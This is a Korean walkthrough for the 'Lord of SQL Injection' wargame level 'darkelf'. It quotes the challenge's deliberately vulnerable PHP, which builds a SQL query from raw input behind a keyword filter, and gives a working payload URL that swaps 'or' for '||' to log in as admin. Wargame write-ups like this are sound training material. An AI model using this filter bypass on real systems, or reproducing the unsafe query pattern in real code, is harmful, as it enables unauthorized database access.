Lord of SQL Injection No.6 - darkelf
...
<?php
  include "./config.php";
  login_chk();
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("darkelf");
  highlight_file(__FILE__);
?>
...
위 문제에서 알 수 있는 것
preg_match로 인해 . ()가 $_GET[pw]에 들어 있으면 No Hack ~_~이 뜨면서 문제풀이에 실패하게 된다.
preg_match로 인해 or and가 대소문자 구분없이 $_GET[pw]에 들어가 있으면 HeHe라고 뜨며 문제풀이에 실패하게 된다._
id값은 고정되어 있으므로 pw에 값을 넣어 조작해야한다.
DB에 저장된 id 값이 admin이 되도록 조작하면 문제가 풀린다.

문제 풀이 법
1)or and 우회
or은 기호로 파이프라인 두개와 같고(||) and는 기호로 앤퍼센트 두개와 같다.(&&)

los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=123'|| id='admin'-- -
or이 들어갈 부분을 ||으로 대체
